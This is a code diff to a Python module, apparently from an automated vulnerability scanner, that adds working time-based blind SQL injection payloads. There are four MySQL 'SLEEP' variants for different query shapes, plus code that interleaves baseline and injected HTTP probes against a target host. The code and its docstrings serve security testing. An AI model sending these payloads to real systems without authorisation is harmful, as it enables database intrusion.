@@ -1,26 +1,35 @@
-"""The probe grammar for a timing-differential technique, as data.
+"""The probe grammar for blind SQL injection via a timing side channel, as data.
 
-Two populations, deliberately symmetric:
+Two populations, cheapest first, alternating so drifting server load hits both:
 
-``baseline``
-    The parameter set to a value that carries *no* delay payload — just the same
-    length and shape, so the two requests differ in one property (the payload's
-    semantics) rather than in size, shape or spelling.
-``injected``
-    The same request with the delay payload. On the fixture the payload is the
-    sleep marker; against a real target the grammar would hold the SQLSleep
-    shapes, but the *structure* — N of each, alternating, labelled — is the
-    technique, which is what makes it testable offline.
+**the baseline** — one quiet request, repeated ``SAMPLES_PER_POPULATION`` times.
+Same length, same shape, no SQL semantics: ``QUIET_PAYLOAD`` is a string the
+target has no reason to interpret, and its *only* job is to measure the target's
+ordinary response time on this parameter.
 
-Every spec carries ``timing_class`` in its detail, and the driver forwards it to
-the observation layer so each response is labelled with its population. That
-label is the join key the interpreter and the verifier both group by — a plain
-lookup, never a parse of the URL.
+**the injected family** — real time-delay SQL, one two-sample population per
+*interpolation shape*. A single payload cannot cover a class whose grammar
+depends on how the parameter enters the query: a quote-closed string injection
+is a syntax error in a numeric context, and a bare-numeric injection is a string
+in a quoted one. The family is defined by shape — the property of the *class* —
+never by a target's dialect or name:
 
-The alternation (baseline, injected, baseline, injected…) is the grammar's one
-defence against drifting server load: a slow-down that arrives mid-run hits both
-populations instead of being mistaken for an injection. A technique that sent
-all baselines first would measure the weather, not the target.
+* ``numeric``      — ``1 AND SLEEP(d)``          (the parameter lands bare)
+* ``quote_closed`` — ``1' AND SLEEP(d) AND 'a'='a``  (inside single quotes,
+  kept syntactically closed so the statement still parses)
+* ``quote_paren``  — ``1') AND SLEEP(d) AND ('a'='a`` (inside quotes and parens)
+* ``comment``      — ``1' AND SLEEP(d)-- -``      (quotes closed, tail commented)
+
+Every variant asks for the same delay; the ones whose shape does not fit the
+target's query are syntax errors that return fast, which is exactly what makes
+the comparison honest: the variant that separates is the one whose shape the
+target parsed. The interpreter picks the winning variant and carries its
+payloads in the candidate's confirmation spec, so the verifier re-measures the
+*same* SQL it proposed — never a second copy of the table that could drift.
+
+The dialect here is deliberately one (``SLEEP``). A second dialect (``pg_sleep``,
+``WAITFOR DELAY``) is a table row, not a redesign — and it is cheaper to add
+when a second target demands it than to carry untested spellings now.
 """
 
 from __future__ import annotations
@@ -36,15 +45,36 @@ from ..common import with_parameter
 
 NAME = "sqli_blind_time"
 
-#: The substring the fixture's ``/delay`` endpoint sleeps on. Against a real
-#: target the payload row below is what changes; the grammar does not.
-SLEEP_PAYLOAD = "ve-sleep"
-#: The baseline: same length, same shape, no semantics.
+#: The baseline: same length, same shape, no semantics a SQL parser could use.
 QUIET_PAYLOAD = "ve-noop0"
 
-#: Samples per population. Even at the fixture's 2s sleep this is the most
-#: expensive probe set in the engine — declared as such in the manifest's noise.
+#: The delay every variant asks for, in seconds. One number, declared once: the
+#: margin (the interpreter's) and the target's latency both read against it.
+SLEEP_SECONDS = 4.0
+
+#: Samples per population. The baseline pair and each variant's pair — the most
+#: expensive probe set in the engine, declared as such in the manifest's noise.
 SAMPLES_PER_POPULATION = 2
+
+#: The injected family, cheapest-order-independent: each entry is an
+#: interpolation shape and the SQL that fits it. ``{d}`` is the delay. Defined
+#: by shape, not by target — no entry names an application or a dialect's host.
+PAYLOAD_VARIANTS: tuple[tuple[str, str], ...] = (
+    ("numeric", "1 AND SLEEP({d})"),
+    ("quote_closed", "1' AND SLEEP({d}) AND 'a'='a"),
+    ("quote_paren", "1') AND SLEEP({d}) AND ('a'='a"),
+    ("comment", "1' AND SLEEP({d})-- -"),
+)
+
+#: The variants as concrete payload strings, in declaration order.
+SLEEP_PAYLOADS: tuple[str, ...] = tuple(
+    template.replace("{d}", str(SLEEP_SECONDS)) for _, template in PAYLOAD_VARIANTS
+)
+
+#: Back-compat alias for the first variant. The candidate's own payload field
+#: (and any reader of it) wants *a* canonical spelling; the grammar's answer is
+#: the family, and the first row is the family's representative.
+SLEEP_PAYLOAD = SLEEP_PAYLOADS[0]
 
 TIMING_BASELINE = "baseline"
 TIMING_INJECTED = "injected"
@@ -52,6 +82,14 @@ TIMING_INJECTED = "injected"
 
 def probe_id(hypothesis: Hypothesis) -> str:
     return f"{NAME}:{hypothesis.surface.host}:{hypothesis.surface.param}"
+
+
+def variant_payload(variant: str) -> str:
+    """The SQL text for *variant*, or ``""`` when the name is not in the table."""
+    for name, template in PAYLOAD_VARIANTS:
+        if name == variant:
+            return template.replace("{d}", str(SLEEP_SECONDS))
+    return ""
 
 
 def _detail(hypothesis: Hypothesis, payload: str, timing_class: str) -> dict:
@@ -64,21 +102,42 @@ def _detail(hypothesis: Hypothesis, payload: str, timing_class: str) -> dict:
 
 
 def probes(hypothesis: Hypothesis) -> list[ProbeSpec]:
-    """The alternating baseline/injected population, in send order."""
+    """The alternating baseline and injected populations, in send order.
+
+    Each round opens with one baseline sample and then takes one sample of every
+    variant, so baseline and injected requests interleave across the whole run: a
+    load spike that lands mid-run hits both populations instead of posing as an
+    injection — the same drift defence the two-population grammar always had,
+    stretched over the family.
+    """
     surface = hypothesis.surface
     probe = probe_id(hypothesis)
     specs: list[ProbeSpec] = []
     for index in range(SAMPLES_PER_POPULATION):
-        for timing_class, payload in (
-            (TIMING_BASELINE, QUIET_PAYLOAD),
-            (TIMING_INJECTED, SLEEP_PAYLOAD),
-        ):
+        specs.append(
+            ProbeSpec(
+                id=f"{probe}:{TIMING_BASELINE}:{index}",
+                kind=KIND_HTTP,
+                host=surface.host,
+                detail=_detail(hypothesis, QUIET_PAYLOAD, TIMING_BASELINE),
+                oracle=ORACLE_TIMING_DIFFERENTIAL,
+                noise={
+                    "requests_per_surface": 1,
+                    "burstiness": 0.9,
+                    "fingerprint_distance": 0.7,
+                    "requires_browser": False,
+                },
+                produces="semantic",
+                purpose=PURPOSE_PROPOSE,
+            )
+        )
+        for variant, payload in zip((name for name, _ in PAYLOAD_VARIANTS), SLEEP_PAYLOADS):
             specs.append(
                 ProbeSpec(
-                    id=f"{probe}:{timing_class}:{index}",
+                    id=f"{probe}:{TIMING_INJECTED}:{variant}:{index}",
                     kind=KIND_HTTP,
                     host=surface.host,
-                    detail=_detail(hypothesis, payload, timing_class),
+                    detail=_detail(hypothesis, payload, TIMING_INJECTED),
                     oracle=ORACLE_TIMING_DIFFERENTIAL,
                     noise={
                         "requests_per_surface": 1,
@@ -93,45 +152,17 @@ def probes(hypothesis: Hypothesis) -> list[ProbeSpec]:
     return specs
 
 
-def measurement_probes(hypothesis: Hypothesis) -> list[ProbeSpec]:
-    """The confirmation population the *verifier* executes (deferred by the driver).
-
-    Same grammar, fresh measurements: the verifier re-runs both populations
-    itself rather than re-reading the proposer's numbers, which is what makes
-    ``differential`` an independent class rather than a second opinion from the
-    same data.
-    """
-    surface = hypothesis.surface
-    probe = probe_id(hypothesis)
-    specs: list[ProbeSpec] = []
-    for index in range(SAMPLES_PER_POPULATION):
-        for timing_class, payload in (
-            (TIMING_BASELINE, QUIET_PAYLOAD),
-            (TIMING_INJECTED, SLEEP_PAYLOAD),
-        ):
-            specs.append(
-                ProbeSpec(
-                    id=f"{probe}:verify:{timing_class}:{index}",
-                    kind=KIND_HTTP,
-                    host=surface.host,
-                    detail=_detail(hypothesis, payload, timing_class),
-                    oracle=ORACLE_TIMING_DIFFERENTIAL,
-                    noise={},
-                    produces="differential",
-                    purpose="confirm",
-                )
-            )
-    return specs
-
-
 __all__ = [
     "NAME",
+    "PAYLOAD_VARIANTS",
     "QUIET_PAYLOAD",
     "SAMPLES_PER_POPULATION",
     "SLEEP_PAYLOAD",
+    "SLEEP_PAYLOADS",
+    "SLEEP_SECONDS",
     "TIMING_BASELINE",
     "TIMING_INJECTED",
-    "measurement_probes",
     "probe_id",
     "probes",
+    "variant_payload",
 ]
